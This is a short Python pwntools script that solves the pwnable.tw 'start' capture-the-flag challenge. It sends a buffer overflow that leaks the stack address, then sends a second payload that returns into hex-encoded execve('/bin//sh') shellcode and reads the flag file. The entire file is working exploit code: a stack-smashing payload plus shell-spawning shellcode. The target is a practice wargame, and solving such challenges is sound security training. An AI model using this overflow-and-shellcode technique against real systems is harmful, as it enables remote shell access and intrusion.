# coding:utf-8
import socket
import struct
from pwn import *

conn = remote('chall.pwnable.tw', 10000)
# conn = process('./start')
print(conn.recv(20))
payload = 'a' * 20 + struct.pack('<I', 0x08048087)
conn.send(payload)

buf = conn.recv(20)
esp = u32(buf[:4])
print("esp:0x{:08x}".format(esp))

shellcode = '31c050682f2f7368682f62696e89e3505389e199b00bcd80'.decode('hex')
print("shellcode:" + shellcode)
payload = 'a' * 20 + p32(esp+20) + shellcode
conn.send(payload)
print('payload:' + payload)
conn.send('cat /home/start/flag\n')
print(conn.recv())